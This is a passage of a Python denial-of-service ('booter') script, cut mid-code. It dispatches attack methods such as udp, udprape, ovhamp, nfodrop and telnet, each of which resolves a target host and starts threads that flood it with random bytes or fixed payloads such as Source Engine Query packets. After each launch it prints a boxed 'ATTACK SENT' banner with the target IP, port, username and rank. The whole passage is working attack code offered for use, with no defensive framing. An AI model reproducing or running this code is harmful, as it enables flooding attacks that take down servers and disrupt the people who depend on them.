║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [TCP]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [HOMESLAP]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [UDP]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [KILLALLV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [KILLALLV3]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [UDPRAPE]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [UDPRAPEV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [UDPBYPASS]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [ICMPRAPE]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [UDPRAPEV3]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [NFODROP]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [OVH-NAT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [OVH-AMP]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [NFO-CRUSH]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [GREETH]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [TELNET]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
